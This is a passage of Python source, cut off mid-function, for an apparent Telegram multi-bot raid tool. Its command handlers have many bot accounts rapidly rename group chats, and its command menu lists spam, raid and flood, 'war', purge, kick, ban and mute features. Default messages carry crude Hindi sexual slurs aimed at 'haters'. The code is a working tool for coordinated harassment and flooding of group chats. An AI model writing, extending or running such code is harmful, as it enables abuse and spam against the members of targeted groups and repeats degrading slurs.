cmd_cursemark = _make_legend_cmd(_cursemark_factory, "CURSEMARK", "ꩤ")

def _bots() -> List[Any]:
    return [b for b in all_bot_instances if b is not None]

def _get_args(ctx) -> List[str]:
    return ctx.args or []

def _txt_arg(ctx) -> str:
    return " ".join(_get_args(ctx)).strip()

async def _reply(msg, text: str):
    for chunk in _split_text(text):
        try:
            await msg.reply_text(chunk)
        except Exception:
            pass

def _split_text(text: str, limit: int = 4096):
    """Split text into chunks at newline boundaries, each ≤ limit chars."""
    chunks = []
    current = ""
    for line in text.split("\n"):
        segment = (line + "\n")
        if len(current) + len(segment) > limit:
            if current:
                chunks.append(current.rstrip("\n"))
            current = segment
        else:
            current += segment
    if current.strip():
        chunks.append(current.rstrip("\n"))
    return chunks or [text[:limit]]

async def _send_menu_msg(msg, section: int = 0):
    if 1 <= section <= len(_MENU_SECTIONS):
        text = _MENU_SECTIONS[section - 1]
        for chunk in _split_text(text):
            try:
                await msg.reply_text(chunk)
            except Exception:
                pass
        return
    pid = _menu_media.get("photo_id")
    if pid:
        try:
            await msg.reply_photo(photo=pid, caption=_MENU[:1024])
        except Exception:
            pass
    for chunk in _split_text(_MENU):
        try:
            await msg.reply_text(chunk)
        except Exception:
            pass

@_guard
async def cmd_allcmds(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    -cmds / -allcmds
    Single-page master list of every registered command, grouped by category.
    """
    msg = update.message or update.edited_message
    if not msg:
        return
    text = (
        "╔══════════════════════════════════════╗\n"
        "     ⚡ 𝑨𝑳𝑳 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺 — 𝑴𝑨𝑺𝑻𝑬𝑹 𝑳𝑰𝑺𝑻\n"
        "╠══════════════════════════════════════╣\n"
        "\n"
        "  🔥 𝐍𝐂 𝐂𝐎𝐑𝐄\n"
        "  -𝐧𝐜  -𝐬𝐧𝐜  -𝐠𝐨𝐝  -𝐞𝐯𝐚𝐠𝐨𝐝\n"
        "  -𝐞𝐯𝐚1  -𝐭𝐫𝐢𝐨𝐠𝐨𝐝  -𝐬𝐢𝐥𝐤𝐧𝐜  -𝐜𝐡𝐮𝐝\n"
        "  -𝐛𝐨𝐥𝐝𝐧𝐜  -𝐜𝐮𝐫𝐬𝐢𝐯𝐞𝐧??  -𝐢𝐭𝐚𝐥𝐢𝐜𝐧𝐜  -𝐰𝐚𝐯𝐞𝐧𝐜\n"
        "  -𝐝𝐞𝐚𝐝𝐧𝐜  -𝐯𝐢𝐥𝐥𝐚𝐢𝐧𝐧𝐜  -𝐫𝐚𝐧𝐝𝐨𝐦𝐜𝐨𝐝  -𝐠𝐨𝐝𝐜𝐨𝐝\n"
        "  -𝐩𝐡𝐚𝐧𝐭𝐨𝐦  -𝐭𝐞𝐬𝐭𝐚𝐦𝐞𝐧𝐭  -𝐬𝐡𝐚𝐝𝐨𝐰\n"
        "  -𝐧𝐜𝟏 … -𝐧𝐜𝟏𝟏𝟓  │  -𝐜𝐧𝐜 <𝐧> <𝐭>\n"
        "\n"
        "  ⚔️ 𝐄𝐕𝐀 𝐄𝐋𝐈𝐓𝐄\n"
        "  -𝐬𝐡𝐚𝐫𝐢𝐧𝐠𝐚𝐧  -𝐚𝐤𝐚𝐭𝐬𝐮𝐤𝐢  -𝐦𝐚𝐝𝐚𝐫𝐚\n"
        "  -𝐬𝐮𝐬𝐚𝐧𝐨𝐨  -𝐢𝐭𝐚𝐜𝐡𝐢  -𝐬𝐚𝐬𝐮𝐤𝐞𝐧𝐜𝐬\n"
        "\n"
        "  ⚡ 𝐄𝐕𝐀 𝐋𝐄𝐆𝐄𝐍𝐃\n"
        "  -𝐮𝐜𝐡𝐢𝐡𝐚  -𝐜𝐡𝐢𝐝𝐨𝐫𝐢  -𝐚𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮\n"
        "  -𝐤𝐢𝐫𝐢𝐧  -𝐜𝐮𝐫𝐬𝐞𝐦𝐚𝐫𝐤\n"
        "\n"
        "  🌐 𝐌𝐔𝐋𝐓𝐈-𝐆𝐂 𝐍𝐂\n"
        "  -𝐦𝐠𝐜𝐧𝐜  -𝐦𝐠𝐜𝐜𝐡𝐮𝐝  -𝐦𝐠𝐜𝐛𝐨𝐥𝐝  -𝐦𝐠𝐜𝐟𝐢𝐫𝐞\n"
        "  -𝐦𝐠𝐜𝐰𝐚𝐫  -𝐦𝐠𝐜𝐬𝐮𝐫𝐠𝐞  -𝐦𝐠𝐜𝐜𝐮𝐬𝐭𝐨𝐦\n"
        "  -𝐬𝐭𝐨𝐩𝐦𝐠𝐜𝐧𝐜  -𝐦𝐠𝐜𝐬𝐭𝐚𝐭𝐮𝐬\n"
        "\n"
        "  💬 𝐒𝐏𝐀𝐌\n"
        "  -𝐬𝐩𝐚𝐦  -𝐬𝐥𝐢𝐝𝐞𝐬𝐩𝐚𝐦  -𝐬𝐰𝐢𝐩𝐞𝐬𝐩𝐚𝐦\n"
        "  -𝐛𝐮𝐫𝐬𝐭𝐬𝐩𝐚𝐦  -𝐜𝐡𝐮𝐝𝐬𝐩𝐚𝐦  -𝐫𝐚𝐩𝐢𝐝𝐟𝐢𝐫𝐞\n"
        "  -𝐜𝐨𝐩𝐲𝐬𝐩𝐚𝐦  -𝐚𝐮𝐭𝐨𝐫𝐞𝐩𝐥𝐲  -𝐫𝐞𝐚𝐜𝐭\n"
        "  -𝐬𝐭𝐨𝐩𝐬𝐩𝐚𝐦  -𝐬𝐭𝐨𝐩𝐬𝐥𝐢𝐝𝐞  -𝐬𝐭𝐨𝐩𝐫𝐞𝐩𝐥𝐲\n"
        "\n"
        "  🔁 𝐑𝐀𝐈𝐃 & 𝐅𝐋𝐎𝐎𝐃\n"
        "  -𝐫𝐫  -𝐦𝐫  -𝐦𝐫𝐚𝐢𝐝  -𝐫𝐬  -𝐫𝐥  -𝐫𝐛  -𝐦𝐫𝐫\n"
        "  -𝐫𝐟  -𝐭𝐬  -𝐭𝐚𝐫𝐠𝐞𝐭𝐫𝐞𝐩𝐥𝐲  -𝐭𝐚𝐫𝐠𝐞𝐭𝐬𝐥𝐢𝐝𝐞\n"
        "\n"
        "  ⚔️ 𝐖𝐀𝐑\n"
        "  -𝐧𝐜𝐝𝐞𝐥  -𝐧𝐜𝐰𝐚𝐫  -𝐦𝐮𝐥𝐭𝐢𝐰𝐚𝐫\n"
        "  -𝐦𝐮𝐭𝐞  -𝐮𝐧𝐦𝐮𝐭𝐞  -𝐬𝐭𝐨𝐩𝐧𝐜𝐰𝐚𝐫\n"
        "\n"
        "  🗑️ 𝐏𝐔𝐑𝐆𝐄\n"
        "  -𝐩𝐮𝐫𝐠𝐞  -𝐩𝐮𝐫𝐠𝐞𝐦𝐞  -𝐩𝐮𝐫𝐠𝐞𝐛𝐨𝐭  -𝐩𝐮𝐫𝐠𝐞𝐚𝐥𝐥\n"
        "\n"
        "  🏛️ 𝐆𝐂 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓\n"
        "  -𝐠𝐜𝐢𝐧𝐟𝐨  -𝐬𝐞𝐭𝐠𝐜𝐭𝐢𝐭𝐥𝐞  -𝐬𝐞𝐭𝐠𝐜𝐝𝐞𝐬𝐜\n"
        "  -𝐠𝐞𝐭𝐢𝐧𝐯𝐢𝐭𝐞  -𝐩𝐢𝐧𝐦𝐬𝐠  -𝐮𝐧𝐩𝐢𝐧𝐚𝐥𝐥\n"
        "  -𝐤𝐢𝐜𝐤𝐮𝐬𝐞𝐫  -𝐛𝐚𝐧𝐭𝐚𝐫𝐠𝐞𝐭  -𝐮𝐧𝐛𝐚𝐧𝐮𝐬𝐞𝐫\n"
        "  -𝐦𝐮𝐭𝐞𝐮𝐬𝐞𝐫  -𝐮𝐧𝐦𝐮𝐭𝐞𝐮𝐬𝐞𝐫  -𝐠𝐜𝐥𝐞𝐚𝐯𝐞\n"
        "\n"
        "  🖼️ 𝐏𝐅𝐏\n"
        "  -𝐚𝐝𝐝𝐩𝐟𝐩  -𝐩𝐟𝐩𝐥𝐨𝐨𝐩  -𝐬𝐞𝐭𝐩𝐟𝐩𝐨𝐧𝐜𝐞\n"
        "  -𝐝𝐞𝐥𝐞𝐭𝐞𝐠𝐜𝐩𝐟𝐩  -𝐩𝐟𝐩𝐩𝐨𝐨𝐥  -𝐜𝐥𝐞𝐚𝐫𝐩𝐟𝐩\n"
        "\n"
        "  🎨 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄𝐒\n"
        "  -𝐚𝐝𝐝𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞  -𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞𝐬  -𝐝𝐞𝐥𝐭𝐩𝐥\n"
        "  -𝐜𝐧𝐜  -𝐩𝐫𝐞𝐯𝐢𝐞𝐰  -𝐜𝐥𝐞𝐚𝐫𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞𝐬\n"
        "\n"
        "  🎵 𝐒𝐎𝐍𝐆\n"
        "  -𝐚𝐝𝐝𝐬𝐨𝐧𝐠  -𝐬𝐨𝐧𝐠  -𝐬𝐨𝐧𝐠𝐬𝐩𝐚𝐦  -𝐬𝐭𝐨𝐩𝐬𝐨𝐧𝐠\n"
        "  -𝐬𝐨𝐧𝐠𝐬  -𝐝𝐞𝐥𝐬𝐨𝐧𝐠  -𝐬𝐢\n"
        "\n"
        "  📞 𝐕𝐎𝐈𝐂𝐄 𝐂𝐀𝐋𝐋\n"
        "  -𝐯𝐜𝐚𝐥𝐥  -𝐯𝐜𝐚𝐥𝐥𝐥𝐨𝐨𝐩  -𝐯𝐜𝐚𝐥𝐥𝐧𝐞𝐱𝐭  -𝐯𝐜𝐚𝐥𝐥𝐬𝐭𝐨𝐩\n"
        "\n"
        "  🤖 𝐁𝐎𝐓 𝐂𝐎𝐍𝐓𝐑𝐎𝐋\n"
        "  -𝐛𝐨𝐭𝐬  -𝐚𝐝𝐝𝐛𝐨𝐭  -𝐚𝐝𝐝𝐚𝐥𝐥𝐛𝐨𝐭𝐬\n"
        "  -𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐛𝐨𝐭  -𝐛𝐨𝐭𝐧𝐚𝐦𝐞\n"
        "\n"
        "  🔐 𝐒𝐔𝐃𝐎\n"
        "  -𝐚𝐝𝐝𝐬𝐮𝐝𝐨  -𝐫𝐞𝐦𝐨𝐯𝐞𝐬𝐮𝐝𝐨  -𝐬𝐮𝐝𝐨𝐥𝐢𝐬𝐭\n"
        "\n"
        "  🛠 𝐓𝐎𝐎𝐋𝐒\n"
        "  -𝐬𝐭𝐚𝐭𝐮𝐬  -𝐮𝐩𝐭𝐢𝐦𝐞  -𝐩𝐢𝐧𝐠  -𝐟𝐥𝐨𝐨𝐝𝐬𝐭𝐚𝐭\n"
        "  -𝐬𝐩𝐞𝐞𝐝𝐭𝐞𝐬𝐭  -𝐧𝐜𝐛𝐞𝐧𝐜𝐡  -𝐝𝐞𝐥𝐚𝐲𝐬\n"
        "  -𝐬𝐞𝐭𝐝𝐞𝐥𝐚𝐲  -𝐫𝐝  -𝐠𝐜𝐥𝐢𝐬𝐭  -𝐠𝐥𝐨𝐛𝐚𝐥𝐬𝐭𝐨𝐩\n"
        "  -𝐬𝐭𝐨𝐩  -𝐡𝐞𝐥𝐩\n"
        "\n"
        "  🎭 𝐅𝐑𝐈𝐄𝐍𝐃 𝐍𝐂𝐒\n"
        "  -𝐤𝐞𝐧𝐭𝐨𝐧𝐜  -𝐚𝐧𝐬𝐡𝐧𝐜  -𝐜𝐫𝟕𝐧𝐜  -𝐰𝐚𝐡𝐚𝐛𝐧𝐜\n"
        "  -𝐬𝐮𝐧𝐧𝐲𝐧𝐜  -𝐭𝐲𝐬𝐨𝐧𝐧𝐜  -𝐳𝐞𝐧𝐢𝐧𝐜  -𝐫𝐞𝐱𝐧𝐜\n"
        "  -𝐚𝐫𝐧𝐚𝐯𝐧𝐜  -𝐬𝐚𝐬𝐮𝐤𝐞𝐧𝐜  -𝐨𝐛𝐢𝐭𝐨𝐧𝐜  -𝐫𝐚𝐢𝐬𝐞𝐧𝐧𝐜\n"
        "  -𝐫𝐞𝐱𝐱𝐧𝐜  -𝐬𝐡𝐨𝐮𝐫𝐲𝐚𝐧𝐜  -𝐚𝐦𝐚𝐧𝐧𝐜  -𝐲𝐚𝐬𝐡𝐧𝐜\n"
        "  -𝐞𝐫𝐫𝐨𝐫𝐧𝐜  -𝐯𝐢𝐨𝐧𝐜  -𝐚𝐫𝐞𝐬𝐧𝐜  -𝐧𝐨𝐬𝐭𝐧𝐜\n"
        "  -𝐲𝐨𝐮𝐫𝐬𝐨𝐧𝐜  -𝐤𝐰𝐞𝐟𝐧𝐜  -𝐰𝐚𝐬𝐢𝐦𝐧𝐜\n"
        "\n"
        "╠══════════════════════════════════════╣\n"
        "  📖 𝘋𝘦𝘵𝘢𝘪𝘭𝘦𝘥 𝘮𝘦𝘯𝘶𝘴: -𝐦𝐞𝐧𝐮 <𝟏-𝟐𝟑>\n"
        "╚══════════════════════════════════════╝"
    )
    await _reply(msg, text)


@_guard
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    known_chats.add(cid)
    _save_json(GROUPS_FILE, list(known_chats))
    args = _get_args(ctx)
    section = 0
    if args:
        try:
            section = int(args[0])
        except ValueError:
            pass
    await _send_menu_msg(msg, section)

@_guard
async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    count = 0
    try:
        count = await tc.stop_all(cid)
    except Exception:
        pass
    # Clear all per-chat state regardless of task stop result
    try:
        mute_chats.discard(cid)
        ncdel_chats.discard(cid)
        autoreact_chats.pop(cid, None)
        autoreply_chats.pop(cid, None)
        ncwar_targets.pop(cid, None)
        _multiwar_active.pop(cid, None)
        targetslide_chats.pop(cid, None)
        targetreply_chats.pop(cid, None)
        pfploop_active.pop(cid, None)
        replyflood_chats.pop(cid, None)
        _nc_info.pop(cid, None)
    except Exception:
        pass
    try:
        await _reply(msg,
            "╔══════════════════════╗\n"
            "  ⛔ 𝐒𝐓𝐎𝐏𝐏𝐄𝐃\n"
            f"  𝘒𝘪𝘭𝘭𝘦𝘥 {count} 𝘵𝘢𝘴𝘬𝘴\n"
            "╚══════════════════════╝"
        )
    except Exception:
        pass

async def _start_nc(msg, chat_id: int, factory, label: str, engine_name="BLAZE"):
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    async def _run(stop_ev):
        await _run_engine(chat_id, bots, stop_ev, factory)

    await tc.start(chat_id, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  ⚡ 𝐍𝐂 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {label}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  🔧 𝘌𝘯𝘨: TURBO · 𝟎.𝟏𝟓𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_nc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -nc <text>")
        return
    await _start_nc(msg, cid, _pure_nc_factory(txt), txt)

@_guard
async def cmd_boldnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -boldnc <text>")
        return
    await _start_nc(msg, msg.chat_id, _font_factory(txt, "bold"), f"𝐁𝐎𝐋𝐃 {txt}")

@_guard
async def cmd_cursivenc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -cursivenc <text>")
        return
    await _start_nc(msg, msg.chat_id, _font_factory(txt, "cursive"), f"𝑪𝒖𝒓𝒔𝒊𝒗𝒆 {txt}")

@_guard
async def cmd_italicnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -italicnc <text>")
        return
    await _start_nc(msg, msg.chat_id, _font_factory(txt, "italic"), f"𝘐𝘵𝘢𝘭𝘪𝘤 {txt}")

@_guard
async def cmd_wavenc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -wavenc <text>")
        return
    await _start_nc(msg, msg.chat_id, _wave_factory(txt), f"🌊 Wave {txt}")

@_guard
async def cmd_chud(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -chud <text>")
        return

    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    gap = _nc_send_gap if _nc_send_gap is not None else 0.09
    _nc_info[cid] = {"engine": "CHUD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _chud_engine(cid, bots, stop_ev, _chud_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  💥⚡ 𝑪𝑯𝑼𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ⚡💥\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘗𝘪𝘱𝘦𝘭𝘪𝘯𝘦 · {gap:.2f}𝘴 · ~{1/gap:.0f}/𝘴𝘦𝘤\n"
        f"  🔥 𝘡𝘦𝘳𝘰 𝘑𝘪𝘵𝘵𝘦𝘳 · 𝘡𝘦𝘳𝘰 𝘍𝘭𝘰𝘰𝘥 · 𝘍𝘢𝘴𝘵𝘦𝘴𝘵\n"
        f"  💥 𝘞𝘰𝘳𝘥𝘴: LUND·TBKC·TBR·TMR·चुदोड़े\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_evancs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "EVA"
    idx = [0]
    factories = [_eva_factory(txt, i) for i in range(10)]
    def _cycling_factory():
        f = factories[idx[0] % len(factories)]
        idx[0] += 1
        return f()
    await _start_nc(msg, cid, _cycling_factory, f"⚡ All Eva NCs")

async def _friend_nc_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE, friend: str):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or friend
    uni = FRIENDS_UNI.get(friend, _to_bold_italic(friend))
    await _start_nc(msg, cid, _friend_nc_factory(friend, txt), f"👤 {uni} NC")

@_guard
async def cmd_randomcod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx) or "EVA"
    await _start_nc(msg, msg.chat_id, _randomcod_factory(txt), "🌀 RANDOMCOD")

@_guard
async def cmd_godcod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "EVA"
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.20

    async def _run(stop_ev):
        await _god_engine(cid, bots, stop_ev, _randomcod_factory(txt))

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚡𝑮𝑶𝑫𝑪𝑶𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘚𝘺𝘯𝘤 𝘎𝘢𝘵𝘦 · {gap:.2f}𝘴 𝘵𝘪𝘤𝘬\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_deadnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx) or "DEAD"
    await _start_nc(msg, msg.chat_id, _dead_factory(txt), "♛ DEAD NC")

@_guard
async def cmd_nnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx) or "𝑯𝑨𝑻𝑬𝑹𝑺 𝑲𝑰 𝑪𝑯𝑼𝑫𝑨𝑰 𝑲𝑹𝑵𝑬 𝒀𝑬𝑨𝑯𝑯𝑯"
    await _start_nc(msg, msg.chat_id, _n_factory(txt), "𖤍 NOXNAME NC")

@_guard
async def cmd_snc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -snc <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    async def _run(stop_ev):
        await _surge_engine(cid, bots, stop_ev, _lean_nc_factory(txt))

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  ⚡ 𝐒𝐔𝐑𝐆𝐄 𝐍𝐂 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════╝"
    )

@_guard
async def cmd_god(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -god <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.25
    _nc_info[cid] = {"engine": "GOD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _god_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚡𝑮𝑶𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘈𝘥𝘢𝘱𝘵𝘪𝘷𝘦 · {gap:.2f}𝘴 𝘧𝘭𝘰𝘰𝘳\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_eva1(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -eva1 <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.15
    _nc_info[cid] = {"engine": "EVA1", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _turbo_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚡𝑬𝑽𝑨𝟏 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘚𝘵𝘢𝘨𝘨𝘦𝘳 · {gap:.2f}𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_evagod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -evagod <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.25
    _nc_info[cid] = {"engine": "EVAGOD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _god_engine(cid, bots, stop_ev, _eva_factory(txt, 0))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🗡️⚡𝑬𝑽𝑨𝑮𝑶𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡🗡️\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘈𝘥𝘢𝘱𝘵𝘪𝘷𝘦 · {gap:.2f}𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_triogod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -triogod <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.45
    _nc_info[cid] = {"engine": "TRIOGOD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _trio_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🔱⚡𝑻𝑹𝑰𝑶𝑮𝑶𝑫 𝑵𝑪 𝑺𝑻??𝑹𝑻𝑬𝑫⚡🔱\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: 3·3·4 𝘨𝘳𝘰𝘶𝘱𝘴\n"
        f"  ⚙️  𝘎𝘢𝘱: {gap:.2f}𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_silknc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -silknc <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    step = _nc_send_gap if _nc_send_gap is not None else 0.18
    _nc_info[cid] = {"engine": "SILKNC", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _silk_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🪡⚡ 𝑺𝑰𝑳𝑲 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ⚡🪡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    nc   = tc.running(cid, "nc")
    info = _nc_info.get(cid)
    gap  = _nc_send_gap if _nc_send_gap is not None else 0.25

    if nc and info:
